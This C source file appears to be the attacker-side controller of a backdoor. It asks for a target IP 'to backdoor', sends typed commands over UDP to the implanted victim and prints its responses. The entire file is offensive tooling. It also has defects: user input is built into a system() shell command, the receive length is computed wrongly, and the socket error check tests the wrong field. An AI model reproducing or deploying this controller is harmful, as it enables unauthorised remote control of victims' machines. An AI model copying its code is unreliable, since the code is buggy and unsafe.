#include "attacker.h"

pid_t pid;

int main(void) {
    struct options_attacker opts;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char buffer[RECEIVE_SIZE] = {0};
    char instruction[64] = {0};
    char* nic_interface;
    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    struct sockaddr_in victim_address;

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, str_len, fd_num;

    int exit_flag = 0;
    int len = sizeof(victim_address);


    signal(SIGINT,sig_handler);
    check_root_user();
    options_attacker_init(&opts);
    opts.interface = pcap_lookupdev(errbuf);    // get interface name
    pcap_lookupnet(opts.interface, &netp, &maskp, errbuf);
    get_victim_IP(&opts);
//    get_victim_MAC(&opts);

    create_attacker_socket(&opts, &victim_address);

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    FD_ZERO(&reads);
    FD_SET(STDIN_FILENO, &reads);
    FD_SET(opts.attacker_socket, &reads);
    fd_max = opts.attacker_socket;

    while (1) {
        if (exit_flag == 1) break;
        cpy_reads = reads;

        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        } else if (fd_num == 0) continue; // time out

        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (i == opts.attacker_socket) {
                    recvfrom(opts.attacker_socket, buffer, strlen(buffer), 0, (struct sockaddr*)&victim_address, &len);
                    printf("[ TARGET RESPONSE ]\n%s\n", buffer);
                    memset(buffer, 0, sizeof(char) * 256);
                }
                if (i == STDIN_FILENO) {
                    if (fgets(buffer, sizeof(buffer), stdin)) {
                        buffer[strlen(buffer) - 1] = 0;
                        if (strcmp(buffer, EXIT) == 0) {
                            printf("EXIT program");
                            close(opts.victim_socket);
                            exit_flag = 1;
                            break;
                        }

                        // TODO: Create RAW PACKET
                        sendto(opts.attacker_socket, (const char*)buffer, strlen(buffer), 0, (const struct sockaddr*)&victim_address, sizeof(victim_address));
                        memset(buffer, 0, sizeof(char) * 256);
                    }
                }
            }
        }
    }

    close(opts.attacker_socket);
    return EXIT_SUCCESS;
}


void options_attacker_init(struct options_attacker *opts) {
    memset(opts, 0, sizeof(struct options_attacker));
}


void get_victim_IP(struct options_attacker *opts) {
    uint8_t input_length;

    while (1) {
        printf("Enter [ TARGET IP ] to backdoor: ");
        fflush(stdout);
        fgets(opts->victim_ip, sizeof(opts->victim_ip), stdin);
        input_length = (uint8_t) strlen(opts->victim_ip);
        if (input_length > 0 && opts->victim_ip[input_length - 1] == '\n') {
            opts->victim_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->victim_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void get_victim_MAC(struct options_attacker *opts) {
    char command[64] = {0};
    char mac_str[20] = {0};
    char *token;
    int i = 0;
    sprintf(command, "arping -c 1 -I %s %s", opts->interface, opts->victim_ip);
    system(command);

    printf("\nType Mac address: ");
    fflush(stdout);
    fgets(mac_str, 20, stdin);

    token = strtok(mac_str, ":");
    while (token != NULL && i < 6) {
        opts->victim_MAC[i] = (unsigned char)strtol(token, NULL, 16);
        token = strtok(NULL, ":");
        i++;
    }
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void create_attacker_socket(struct options_attacker *opts, struct sockaddr_in* victim_address) {
    memset(victim_address, 0, sizeof(struct sockaddr_in));

    opts->attacker_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if (opts->victim_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    victim_address->sin_family = AF_INET;
    victim_address->sin_port = htons(DEFAULT_PORT);
    victim_address->sin_addr.s_addr = inet_addr(opts->victim_ip);

    if (victim_address->sin_addr.s_addr == (in_addr_t) -1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}
